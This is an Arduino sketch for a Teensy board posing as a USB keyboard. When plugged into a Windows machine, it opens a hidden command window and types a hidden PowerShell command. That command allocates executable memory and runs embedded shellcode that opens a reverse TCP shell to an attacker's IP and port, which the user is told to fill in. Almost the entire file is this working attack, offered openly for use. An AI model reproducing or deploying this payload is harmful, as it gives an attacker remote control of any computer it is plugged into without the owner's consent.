
// Teensypreter by KernelEguino , thanks 

const unsigned int ledPin = 13;                                    // My Teensy has the built-in LED on pin 13.

void setup()
{
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);
    delay(500);
    digitalWrite(ledPin, LOW);
    hurryUp();                                                     // Fucking drivers.
    spawnReverseTCP();                                             // This gets our shell.
}

void loop()                                                        // This is a one-off program. Looping is irrelevant.
{
}

void hurryUp()                                                     // Wait for the driver to finish installing.
{
    boolean areWeThereYet = capsCheck();                           // Check and see if we can turn on Caps Lock yet.
    while (areWeThereYet == capsCheck())                           // Spam the shit out of it if not.
    {
        returnCode(1, 500);
        hitCaps();
    }
    hitCaps();
}

boolean capsCheck()                                                // Check if Caps Lock is on.
{
    if ((activeLEDs() & 2) == 2)
    {
        return true;
    }
    else
    {
        return false;
    }
}

unsigned int activeLEDs()                                          // Keyboard LED status.
{
    return int(keyboard_leds);
}

void returnCode(unsigned int numBlinks, unsigned int halfDelay)
{
    unsigned int count=0;
    for(count = 0; count != numBlinks; count++)
    {
        digitalWrite(ledPin, HIGH);
        delay(halfDelay);
        digitalWrite(ledPin, LOW);
        delay(halfDelay);
    }
}

void hitCaps()                                                     // Press the Caps Lock button.
{
    Keyboard.set_key1(KEY_CAPS_LOCK);
    Keyboard.send_now();
    delay(100);
    clearKeys();
}

void clearKeys()                                                   // Empty the keystroke buffer.
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void killCaps()                                                    // Turn off Caps Lock.
{
    if (capsCheck())
    {
        hitCaps();
    }
}

void spawnReverseTCP()                                             // Start the real magic.
{
    killCaps();                                                    // Turn off Caps Lock if it's on.
    
    returnCode(1, 100);                                            // Keyboard is ready.
    
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);                  // Open the Run dialog.
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    clearKeys();
    
    delay(1000);
    
    returnCode(1, 100);                                            // Run is ready.
    
    Keyboard.print("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1");  // Start CMD small with dark text.
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
    
    delay(3000);                                                   // Give CMD some time to appear.
    
    returnCode(1, 100);                                            // CMD is ready.
    
                                                                   // The next line sets the Powershell path based on our architecture.
    Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
    
    returnCode(1, 100);                                            // Everything is ready.
    

    /* * * * * * * * * * * *
     *                     *
     *  Take the red pill. *
     *                     *
     * * * * * * * * * * * */

    Keyboard.print("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
    Keyboard.print("[DllImport(\\\"kernel32.dll\\\")]public static ext");
    Keyboard.print("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
    Keyboard.print("ize, uint flAllocationType, uint flProtect);[DllIm");
    Keyboard.print("port(\\\"kernel32.dll\\\")]public static extern In");
    Keyboard.print("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
    Keyboard.print("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
    Keyboard.print("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
    Keyboard.print("lImport(\\\"msvcrt.dll\\\")]public static extern I");
    Keyboard.print("ntPtr memset(IntPtr dest, uint src, uint count);''");
    Keyboard.print(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
    Keyboard.print("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
    Keyboard.print(";[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
    Keyboard.print("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
    Keyboard.print("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
    Keyboard.print("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
    Keyboard.print("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
    Keyboard.print("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
    Keyboard.print("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
    Keyboard.print("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
    Keyboard.print("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
    Keyboard.print("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
    Keyboard.print("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
    Keyboard.print("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
    Keyboard.print("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
    Keyboard.print("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
    Keyboard.print("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
    Keyboard.print("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
    Keyboard.print("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
    Keyboard.print("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
    Keyboard.print("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
    Keyboard.print("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
    
    // Replace [0x@@,0x@@,0x@@,0x@@] with each part of your IP (in hex).
    // Replace [0x@@,0x@@] with your open port (e.g. 65535 = 0xFF,0xFF)
    // Don't forget to remove the [] brackets after editing.
    
    Keyboard.print("[0x@@,0x@@,0x@@,0x@@],0x68,0x02,0x00,[0x@@,0x@@],0");
    
    // MAKE SURE YOU DELETE THE BRACKETS.
    // DO NOT PASS GO UNTIL YOU DELETE THE BRACKETS.
    
    Keyboard.print("x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0");
    Keyboard.print("x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0");
    Keyboard.print("x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0");
    Keyboard.print("x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0");
    Keyboard.print("xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0");
    Keyboard.print("x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0");
    Keyboard.print("xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0");
    Keyboard.print("xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0");
    Keyboard.print("xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -");
    Keyboard.print("gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc");
    Keyboard.print("(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length");
    Keyboard.print("-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $");
    Keyboard.print("sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;");
    Keyboard.print("){Start-sleep 60};';$gq = [System.Convert]::ToBase");
    Keyboard.print("64String([System.Text.Encoding]::Unicode.GetBytes(");
    Keyboard.print("$1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRo");
    Keyboard.print("ot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0");
    Keyboard.print("\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\"");
    Keyboard.print(";iex \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -");
    Keyboard.print("noni -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
    clearKeys();
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();                                           // Send the command.
    delay(100);
    clearKeys();
    
    returnCode(1, 1000);                                           // All done.
}
